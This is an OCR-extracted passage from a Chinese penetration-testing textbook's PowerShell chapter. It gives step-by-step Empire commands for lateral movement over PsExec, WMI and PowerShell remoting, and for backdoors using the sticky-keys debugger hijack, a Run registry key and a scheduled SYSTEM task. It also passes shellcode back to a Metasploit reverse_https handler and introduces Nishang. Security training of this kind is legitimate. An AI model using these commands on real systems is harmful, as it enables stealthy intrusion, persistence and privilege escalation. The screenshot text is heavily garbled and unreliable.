ent/invoke_psexec
：False
Backgr
2
tputExtension:None
Efuectenalty.
scription:
stager on renote hosts using PsExec type
Dptions:
Nane
Required
Value
Description
Listener
False
Listener to use.
图6-145查看设置参数
这里要设置机器名和监听，输入以下命令执行execute后即可看到反弹已经成功，
如图6-146所示。
set ComputerName WIN7-X86.shuteer.testlab
set Listenershuteer
execute
oPSOc 10
te
Enpire:Lateral_no
图6-146反弹成功
输入agents命令查看当前agents，发现多了一个IP为192.168.31.158，机器名为
---
## Page 347
328Web安全政防：渗透测试实战指南
WIN7-X86的服务器，如图6-147所示
1/5972
2017-87-09 62：11
图6-147查看agents
4.Invoke-WMI
它比PsExec安全，所有Window系统都启用了该服务，当攻击者使用wmiexec进
行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无
日志，同时攻击脚本无须写入磁盘，具有极高的隐蔽性，但如果目标机器开启了防
火墙，用wMI将无法连接上目标机器。输入usemodulelateral_movement/invoke_wmi
即可使用该模块，输入info命令查看具体参数，如图6-148所示。
Required
Vslue
Description
Truse
CredID
shuteer
MN7-64.shuteer.testab
Host[s]to execs
Proxy
False
detolt
False
orotr
usernase to use to execute
Proxyfreds
False
default
Lials
UserAgent
False
cefault
stD
false
围6-148查看Invoke-WM1参数
---
## Page 348
第6章PowerSbel或击指南4329
这里同样需要设置机器名和监听，输入以下命令，执行execute命令后即可看到
反弹成功，如图6-149所示。
Set ComputerNane WIN7-X86.shuteer,testlab
Set Listener shuteer
wmi)>
>execute
图6-149反弹成功
WMI还有一个usemodulelateral_movement/invoke_wmi_debugger模块，它使用
WMI去设置五个WindowsAccessibiity可执行文件中任意一个的调试器，这些可执行
文件包括sethc.exe（粘滞键，按五下Shif键即可触发）、narrator.exe（文本转语音，可
利用Utilman接口激活）、Utilman.exe（Windows辅助管理器，按Win+U组合键即可启
用）、Osk.exe（虚拟键盘，可利用Utilman接口启用）、Magnify.exe（放大镜，可利用
Utilman接口启用），各位读者也可以尝试一下。
5.PowerShell Remoting
PowerShellRemoting是PowerShell的远程管理功能，开启Windows远程管理服务
WinRM系统后会监听5985端口，该服务默认在Windows Server 2012中是启动的，在
WindowsServer2003/2008/2008R2中需要手动启动。
如果目标主机启用了PowerShellRemoting，或者拥有启用它的权限的凭据，则可
以使用usemodule lateral_movement/invoke_psremoting模块进行横向渗透，如图6-150
所示。
me WIN7-X86.shuteer.testlab
emoting)>back
图6-150 invoke_psremoting模块
---
## Page 349
330Web安全政防：渗透测试实战指南
6.3.9后门
后门，本意是指一座建筑背面开设的门，通常比较隐蔽，为进出建筑的人提供
方便和隐蔽性。在信息安全领域，后门是指绕过安全控制面获取对程序或系统访问
权的方法。后门最主要的目的就是方便以后再次秘密进入或者控制系统。
1.权限持久性劫持Shift后门
输入usemodulelateral_movementinvoke_wmi_debuggerinfo命令即可使用该模块，
输入info可以查看具体的设置参数，如图6-151所示。
oke i
mt/invoke_wnl_o
gger)>info
a66r
False
rshell/lateral_movenent/invoke_wmi_debugger
Nee
OpsecSafe:False
powershell
OutputExtension: None
False
图6-151查看设置参数
这里需要设置几个参数，输入以下命令，如图6-152所示。
set Listener shuteer
set ComputerName WIN7-64,shuteer.testlab
set TargetBinary sethc.exe
execute
kdga
Enpire:
Delllater
图6-152设置具体的参数
运行后，在目标主机远程登录窗口按5次Shif键即可触发后门，目标主机上会有
一个命令框一闪而过，如图6-153所示。
---
## Page 350
第6章PowerShel击指南331
WIN7-64\shute
图6-153触发后门
可以发现Empire已经有反弹代理上线，这里为了截图，笔者按了3回Shif后门，
所以弹回来3个代理，如图6-154所示。
图6-154反弹成功
需要注意的是，sethc.exe可以替换成以下这几项，如下所示。
Utilman.exe（使用Win+U组合键启动）。
osk.exe（屏幕上的键盘：使用Win+U启动组合键）。
Narrator.exe（启动讲述人：使用Win+U启动组合键）。
Magnify.exe（放大镜：使用Win+U组合键启动）。
2.注册表注入后门
输入usemodule persistence/userland/registry命令即可使用该模块，该模块运行后
会在目标主机启动项里增加一个命令，按以下命令设置其中几个参数，如图6-155所示。
---
## Page 351
332Web安全攻防：渗透测试实战指南
set Listener shuteer
set RegPath HKCU: Software\M1crosoft\Windows \CurrentVersion\Run
execute
Optlens:
preycres Fatte
Mane
RequLred
Value
Description
default
EventLootD Fatse
tore
Logu
ExtFite
False
Cleamug
False
ofasta
AOSPth
false
specifetriogerand any
Atter
data-strean tocetion to store
ist
True
RegPath
False
eytan
locationtnstorethe
to use.
Prexy
Fatse
etalt
defaalt
or other)
userstettrituefrth
图6-155设置参数
当我们登录系统时木马就会运行，服务端反弹成功，如图6-156所示。
Erpire:
图6-156反弹成功
3.计划任务获得系统权限
输入usemodule persistence/elevated/schtasks命令即可使用该模块，这里要设置
DailyTime、Listener这两个参数，输入以下命令，设置完后输入execute命令，到了设
置的具体时间时将成功返回一个高权限的Shell，在实际渗透中运行该模块时，杀毒
软件会有提示，如图6-157所示。
set DailyTine 16:17
set Listener test
execute
---
## Page 352
第6章PowerShell攻击指南333
EL Fres 15218.31.21 n8 a
图6-157反弹成功
接着输入agents命令查看当前agents，可以看到又多了一个具有SYSTEM权限，
Name为LTVZB4WDDTSTLCGL的客户端，如图6-158所示，说明提权成功。
lIP
Deley
Last Seer
oovershetL/3564
2:27-07-0-:3/1
LTV200T5T/0G182.168.31.251N7-64
2ER55TEHp0erhlL/15805/6.2817-97-6894:17:20
图6-158查看agents
这里如果把 setRegPath 的参数改为 HKCU:SOFTWAREMicrosoftWindows\
CurrentVersionRun，那么就会在16:17分添加一个注册表注入后门，读者可以练习一
下
6.3.10
Empire反弹回Metasploit
在实际渗透中，当拿到WebShel1上传的MSF客户端无法绕过目标主机的杀毒软件
时，可以使用PowerShell来绕过，也可以执行Empire的Payload来绕过，成功之后再使
用Empire的模块将其反弹回Metasploit。
这里使用usemodulecode_execution/invoke_shellCode模块修改两个参数：Lhost
和Lport。将Lhost修改为MSF所在主机的IP，按以下命令设置完毕，如图6-159所示。
Set Lhost 192.168. 31.247
Set Lport 4444
ke_shellcode)>set Lhost 192.168.31.247
deex
execute
lobstarted:Debug321pd5v
图6-159设置参数
在MSF上设置监听，命令如下，运行后，就可以收到Empire反弹回来的Shell了，
如图6-160所示。
---
## Page 353
334Web安全攻防：渗造测试实战指南
Use exploit/multi/handler
Set payloadwindows/meterpreter/reverse_https
Set Lhost 192.168.31.247
Set 1port 4444
Run
dler on https://192.168.31.247:444
:52-0400
neterpreter >
图6-160反弹成功
6.4Nishang
Nishang是一款针对PowerShell的渗透工具。它基于PowerShell的渗透测试专用工
具，集成了框架、脚本和各种Payload，包括了下载和执行、键盘记录、DNS、延时
命令等脚本，被广泛应用于渗透测试的各个阶段。其下载地址为htps:/github.com
samratashok/nishang。
6.4.1Nishang简介
Nishang要在PowerShell3.0以上的环境中才可以正常使用，也就是说在Windows
7下默认是有点小问题的，因为Windows下自带的环境是PowerShell2.0。
导入模块之后输入Get-Command-Modulenishang命令查看Nishang都有哪些模
块，如图6-161所示。
---
## Page 354
第6章PowerShell攻击指南335
Mant
Def inition
dd-Exf iltrat ion
add-RegBackdoor
Check-un
tTe-ROT13
DNS_IXT_
nlead-Exec
Execute-DNSTXT-Cede
ExrteTevt
Firelistene
PassMashes
et-SniShellOutuot
图6-161查看模块列表
从图6-161中可以看到，Nishang的所有命令都被列出来了。执行命令
Get-Information查看结果，这个脚本可以获取目标机器上的大量信息（FTP访问、进
程、计算机配置信息、无线网络和设备的信息、Hosts信息等）。直接执行以下命令，
可以看到列出了本机的部分信息，如图6-162所示。
_PS >Get-Information
---
## Page 355
336Web安全攻防：渗透测试实战指南
ofllan
nstall
llestSbteutTt
stall
utty truated boats
C:oets
sers
CWIAOOS\TEP
图6-162列出本机的部分信息
还需要说的一点是，我们可以在PowerShell中使用Out-File将执行结果导出到文
件中，命令如下所示。
PS D:nishang-master> Get-Information |Out-Fi1e res.txt
这样，就可以把获取的信息保存在res.txt中了。
接着打开Nishang的目录查看目录结构，在导入nishang.psml的时候，Nishang下
的所有模块都可以直接被PowerShell读到。但在实际渗透过程中，肯定不能把Nishang
的整个目录赋值到目标服务器上。所以在远程下载某一个脚本的时候，了解目录结
构对寻找文件位置是很有帮助的，如图6-163所示。
---
## Page 356
第6章PowerShell攻击指南337
2017/4/26 19:16
2917/6/26 19:16
文I4R
2017/6/26 19:16
文共
2017/46/26 19.16
Byp4ss